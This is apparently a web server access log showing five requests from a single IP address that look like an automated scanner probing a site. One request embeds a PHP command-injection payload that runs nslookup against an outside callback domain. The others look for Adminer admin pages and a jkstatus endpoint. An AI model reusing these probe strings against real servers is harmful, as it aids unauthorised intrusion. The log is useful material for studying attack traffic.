27.147.202.214 - - [08/Jul/2021:01:02:50 -0400] "GET /?system(%27nslookup%20hit654907566413687.bxss.me%27)%3ba%23 HTTP/1.1" 500 7565 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:42 -0400] "GET /adminer-4.4.0-mysql.php HTTP/1.1" 500 7565 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:40 -0400] "GET /adminer.php HTTP/1.1" 500 6604 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:22 -0400] "GET /jkstatus;a HTTP/1.1" 500 6303 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
27.147.202.214 - - [08/Jul/2021:01:02:41 -0400] "GET /adminer-4.6.1-en.php HTTP/1.1" 500 6575 "https://www.angelsonhighstreet.com/" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4298.0 Safari/537.36"
